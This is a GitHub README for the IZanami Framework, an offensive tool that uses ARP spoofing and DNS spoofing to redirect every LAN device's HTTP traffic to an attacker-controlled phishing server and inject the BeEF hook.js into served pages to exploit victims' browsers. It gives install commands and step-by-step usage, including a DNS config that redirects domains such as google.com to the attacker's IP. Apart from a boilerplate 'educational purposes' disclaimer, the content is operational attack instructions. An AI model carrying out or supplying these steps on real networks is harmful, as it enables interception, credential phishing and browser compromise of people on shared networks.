# IZanamiFramework
![Python 3.x](https://img.shields.io/badge/python-v3.7-blue) ![Platform linux-debian-based](https://img.shields.io/badge/platform-linux--debian--based-red)

---
<p align="center">
  <img src="https://i.ibb.co/mBGq2yv/logo.png">
</p>
The Izanami Framework is a phishing attacks framework, that use ARP spoof attack and DNS spoofing attack to redirect all LAN devices HTTP requests to a specified address to perform a Powerful Phishing attack, IZanami inject beef-xss hook.js file into each requested HTML page , to target and exploit users's browsers.

# AUTHOR 
```
    [+] AUTHOR:       Yasser Janah
    [+] GITHUB:       https://github.com/yasserjanah
    [+] TWITTER:      https://twitter.com/yasser_janah
    [+] FACEBOOK:     https://fb.com/yasser.janah
```
---
# Legal disclaimer
Usage of ***IZanami Framework***  for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. ***Only use for educational purposes.***

---
# Screenshots
![ARP_SPOOFING_and_DNS_SPOOFING](https://i.ibb.co/9n0PJdv/Screenshot-from-2020-04-09-14-40-49.png)

# Installation
```
git clone https://github.com/yasserjanah/IZanamiFramework.git
cd IZanamiFramework/
chmod +x arp_spoof.py dns_spoof.py runserver.sh
cd scripts
chmod +x install.sh
./installs.sh
```
# Usage
    *** Run this commands with root permissions ***
    
    1) run ARP Spoofing attack :
```
    $ ./arp_spoof.py -t <TARGET(s)> -g <GATEWAY> -i <INTERFACE>
```
    2) configure config/dns.conf :
```
    $ nano config/dns.conf 
        """ example of content of this file """
        [google.com]
            ip = <YOUR_IP OR THE_IP_WHO_YOU_WANT_TO_REDIRECT_CLIENT_TO>
            rule = O ==> Only This Domain OR AS ==> All Subdomain 
```
    3) run DNS Spoofing attack :
```
    $ ./dns_spoof.py
```
    4) run web server :
```
    $ ./runserver.sh
```
DEMO Video Soon
